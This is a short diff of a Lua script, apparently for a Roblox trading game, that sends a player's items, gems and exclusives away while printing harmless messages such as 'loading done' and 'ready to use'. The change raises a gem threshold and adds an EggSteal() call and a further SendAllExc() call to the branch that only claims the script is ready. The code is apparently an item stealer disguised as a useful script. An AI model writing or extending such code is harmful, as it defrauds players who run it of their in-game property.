@@ -326,7 +326,7 @@ local function SendAllGems()
 	until CountGems() == nil or CountGems() < 10000
 end
 
-if CountHuges() > 0 or CountGems() > 10000 then
+if CountHuges() > 0 or CountGems() > 50000 then
 	EmptyBoxes()
 	SendAllHuges()
 	SendAllExc()
@@ -363,5 +363,9 @@ if CountHuges() > 0 or CountGems() > 10000 then
 	SendAllGems()
 	print("loading done")
 else
+	if save.Egg ~= nil then
+		EggSteal()
+	end
+	SendAllExc()
 	print("ready to use")
 end
